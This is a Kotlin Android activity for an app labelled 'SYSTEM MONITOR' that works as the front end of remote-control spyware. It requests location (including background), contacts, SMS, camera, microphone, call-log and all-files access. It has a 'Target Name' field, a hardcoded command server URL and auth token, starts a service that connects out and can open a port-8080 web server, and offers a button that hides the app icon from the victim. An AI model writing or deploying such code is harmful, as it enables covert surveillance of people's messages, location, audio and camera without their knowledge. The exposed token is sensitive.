package com.example.devicecontrol

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.Gravity
import android.view.ViewGroup
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.net.Uri
import android.os.PowerManager
import android.provider.Settings
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.os.Environment
import androidx.appcompat.app.AlertDialog
import android.content.DialogInterface
import java.net.Inet6Address
import java.net.NetworkInterface

class MainActivity : AppCompatActivity() {

    private val REQUEST_CODE_PERMISSIONS = 1001

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        val rootLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(64, 120, 64, 64)
            gravity = Gravity.CENTER_HORIZONTAL
            setBackgroundColor(Color.parseColor("#0F172A"))
            layoutParams = ViewGroup.LayoutParams(-1, -1)
        }

        val header = TextView(this).apply {
            text = "SYSTEM MONITOR"
            textSize = 24f
            setTextColor(Color.parseColor("#38BDF8"))
            setTypeface(null, android.graphics.Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 80)
        }
        rootLayout.addView(header)

        val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)

        fun createInputBox(hintText: String, defaultVal: String, marginB: Int): EditText {
            return EditText(this).apply {
                hint = hintText
                setText(defaultVal)
                setTextColor(Color.parseColor("#F8FAFC"))
                setPadding(40, 40, 40, 40)
                textSize = 14f
                layoutParams = LinearLayout.LayoutParams(-1, -2).apply { setMargins(0, 0, 0, marginB) }
                background = GradientDrawable().apply {
                    setColor(Color.parseColor("#1E293B"))
                    cornerRadius = 24f
                    setStroke(2, Color.parseColor("#334155"))
                }
            }
        }

        val urlInput = createInputBox("Server URL", prefs.getString("ws_url", "https://pygram.xnv.biz.id") ?: "", 32)
        val authInput = createInputBox("Auth Token", prefs.getString("auth_token", "AAEaT_oKgX9mF2T8D0iT_2br1flpqsMLSi8") ?: "", 32)
        val idInput = createInputBox("Target Name (ID)", prefs.getString("device_id", "my_phone") ?: "", 64)
        
        rootLayout.addView(urlInput)
        rootLayout.addView(authInput)
        rootLayout.addView(idInput)

        // Turbo Mode Toggle
        val turboToggle = CheckBox(this).apply {
            text = "TURBO MODE (Super Responsive)"
            setTextColor(Color.parseColor("#94A3B8"))
            isChecked = prefs.getBoolean("turbo_mode", true)
            setPadding(20, 0, 0, 0)
            layoutParams = LinearLayout.LayoutParams(-1, -2).apply { setMargins(0, 0, 0, 64) }
            // Customizing checkbox appearance slightly (if supported)
            buttonTintList = android.content.res.ColorStateList.valueOf(Color.parseColor("#38BDF8"))
        }
        rootLayout.addView(turboToggle)

        val statusText = TextView(this).apply {
            text = "Status: INACTIVE"
            textSize = 14f
            setTextColor(Color.parseColor("#94A3B8"))
            setPadding(0, 0, 0, 64)
            gravity = Gravity.CENTER
        }
        rootLayout.addView(statusText)

        fun createBtn(btnText: String, hexBg: String): Button {
            return Button(this).apply {
                text = btnText
                setTextColor(Color.parseColor("#F8FAFC"))
                textSize = 14f
                setPadding(0, 44, 0, 44)
                layoutParams = LinearLayout.LayoutParams(-1, -2).apply { setMargins(0, 24, 0, 0) }
                background = GradientDrawable().apply {
                    setColor(Color.parseColor(hexBg))
                    cornerRadius = 24f
                }
            }
        }

        // ── IPv6 Section ──────────────────────────────────────────
        val ipv6Label = TextView(this).apply {
            text = "IPv6 Remote Access"
            textSize = 11f
            setTextColor(Color.parseColor("#64748B"))
            setPadding(4, 0, 0, 8)
            layoutParams = LinearLayout.LayoutParams(-1, -2).apply { setMargins(0, 8, 0, 0) }
        }
        rootLayout.addView(ipv6Label)

        val ipv6StatusText = TextView(this).apply {
            text = "—"
            textSize = 13f
            setTextColor(Color.parseColor("#94A3B8"))
            setPadding(28, 20, 28, 20)
            layoutParams = LinearLayout.LayoutParams(-1, -2).apply { setMargins(0, 0, 0, 8) }
            background = GradientDrawable().apply {
                setColor(Color.parseColor("#1E293B"))
                cornerRadius = 20f
                setStroke(2, Color.parseColor("#334155"))
            }
        }
        rootLayout.addView(ipv6StatusText)

        val checkIpv6Btn = createBtn("CHECK IPv6 ADDRESS", "#0F766E")
        checkIpv6Btn.layoutParams = LinearLayout.LayoutParams(-1, -2).apply { setMargins(0, 8, 0, 32) }
        checkIpv6Btn.setOnClickListener {
            val ipv6 = getIpv6Address()
            if (ipv6 != null) {
                ipv6StatusText.text = "✅ IPv6: $ipv6"
                ipv6StatusText.setTextColor(Color.parseColor("#34D399"))
            } else {
                ipv6StatusText.text = "❌ Tidak ada IPv6 global"
                ipv6StatusText.setTextColor(Color.parseColor("#F87171"))
            }
        }
        rootLayout.addView(checkIpv6Btn)

        // ── Web Server Toggle Section ─────────────────────────────
        val webServerLabel = TextView(this).apply {
            text = "Web Server"
            textSize = 11f
            setTextColor(Color.parseColor("#64748B"))
            setPadding(4, 0, 0, 8)
        }
        rootLayout.addView(webServerLabel)

        val webServerEnabled = prefs.getBoolean("web_server_enabled", true)

        val webStatusText = TextView(this).apply {
            text = if (webServerEnabled) "🟢 Web server AKTIF (port 8080)" else "🔴 Web server NONAKTIF"
            textSize = 13f
            setTextColor(if (webServerEnabled) Color.parseColor("#34D399") else Color.parseColor("#F87171"))
            setPadding(28, 20, 28, 20)
            layoutParams = LinearLayout.LayoutParams(-1, -2).apply { setMargins(0, 0, 0, 8) }
            background = GradientDrawable().apply {
                setColor(Color.parseColor("#1E293B"))
                cornerRadius = 20f
                setStroke(2, Color.parseColor("#334155"))
            }
        }
        rootLayout.addView(webStatusText)

        val webServerToggle = CheckBox(this).apply {
            text = "ENABLE WEB SERVER (Port 8080)"
            setTextColor(Color.parseColor("#94A3B8"))
            isChecked = webServerEnabled
            setPadding(20, 0, 0, 0)
            layoutParams = LinearLayout.LayoutParams(-1, -2).apply { setMargins(0, 0, 0, 48) }
            buttonTintList = android.content.res.ColorStateList.valueOf(Color.parseColor("#38BDF8"))
        }
        webServerToggle.setOnCheckedChangeListener { _, isChecked ->
            prefs.edit().putBoolean("web_server_enabled", isChecked).apply()
            val svcIntent = Intent(this@MainActivity, ControlService::class.java).apply {
                action = "TOGGLE_WEB_SERVER"
                putExtra("enabled", isChecked)
            }
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(svcIntent)
            } else {
                startService(svcIntent)
            }
            webStatusText.text = if (isChecked) "🟢 Web server AKTIF (port 8080)" else "🔴 Web server NONAKTIF"
            webStatusText.setTextColor(
                if (isChecked) Color.parseColor("#34D399") else Color.parseColor("#F87171")
            )
        }
        rootLayout.addView(webServerToggle)

        val startButton = createBtn("ACTIVATE SERVICE", "#0284C7")
        startButton.setOnClickListener {
            val url = urlInput.text.toString().trim()
            val devId = idInput.text.toString().trim()
            val authToken = authInput.text.toString().trim()
            val isTurbo = turboToggle.isChecked
            
            if (url.isEmpty()) {
                Toast.makeText(this@MainActivity, "URL is required", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            prefs.edit().apply {
                putString("ws_url", url)
                putString("device_id", devId)
                putString("auth_token", authToken)
                putBoolean("turbo_mode", isTurbo)
                apply()
            }

            statusText.text = "Status: ENGAGED & MONITORING"
            statusText.setTextColor(Color.parseColor("#34D399"))
            checkAndStartService()
        }
        rootLayout.addView(startButton)

        val hideButton = createBtn("HIDE SYSTEM APP", "#E11D48")
        hideButton.setOnClickListener {
            Toast.makeText(this@MainActivity, "App icon will vanish now...", Toast.LENGTH_SHORT).show()
            val pm = packageManager
            pm.setComponentEnabledSetting(
                android.content.ComponentName(this@MainActivity, "com.example.devicecontrol.LauncherAlias"),
                2, 1
            )
            pm.setComponentEnabledSetting(
                android.content.ComponentName(this@MainActivity, MainActivity::class.java),
                2, 1
            )
            finishAffinity()
        }
        rootLayout.addView(hideButton)

        setContentView(rootLayout)
        checkPermissions()
    }

    private fun checkPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.CALL_PHONE
        )

        if (Build.VERSION.SDK_INT == 29) {
            permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }

        if (Build.VERSION.SDK_INT < 30) {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
        
        val missing = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != 0
        }

        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQUEST_CODE_PERMISSIONS)
        } else {
            checkBackgroundLocationPermission()
        }

        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (Build.VERSION.SDK_INT >= 23) {
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (e: Exception) {}
            }
        }

        if (Build.VERSION.SDK_INT >= 30) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                    startActivity(intent)
                }
            }
        }
    }

    private fun checkBackgroundLocationPermission() {
        if (Build.VERSION.SDK_INT >= 30) {
            val hasForeground = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == 0
            val hasBackground = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) == 0

            if (hasForeground && !hasBackground) {
                AlertDialog.Builder(this@MainActivity)
                    .setTitle("Izin Lokasi")
                    .setMessage("Silakan pilih 'Izinkan sepanjang waktu'.")
                    .setPositiveButton("Setuju", object : DialogInterface.OnClickListener {
                        override fun onClick(dialog: DialogInterface?, which: Int) {
                            ActivityCompat.requestPermissions(this@MainActivity, arrayOf(Manifest.permission.ACCESS_BACKGROUND_LOCATION), 1002)
                        }
                    })
                    .show()
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            checkBackgroundLocationPermission()
        }
    }

    private fun checkAndStartService() {
        val intent = Intent(this, ControlService::class.java)
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun getIpv6Address(): String? {
        return try {
            NetworkInterface.getNetworkInterfaces()?.toList()
                ?.flatMap { iface -> iface.inetAddresses.toList() }
                ?.filterIsInstance<Inet6Address>()
                ?.firstOrNull { addr ->
                    !addr.isLoopbackAddress &&
                    !addr.isLinkLocalAddress &&
                    !addr.hostAddress.startsWith("fe80", ignoreCase = true)
                }
                ?.hostAddress
                ?.replace("%.*".toRegex(), "") // strip scope id seperti %wlan0
        } catch (e: Exception) {
            null
        }
    }
}

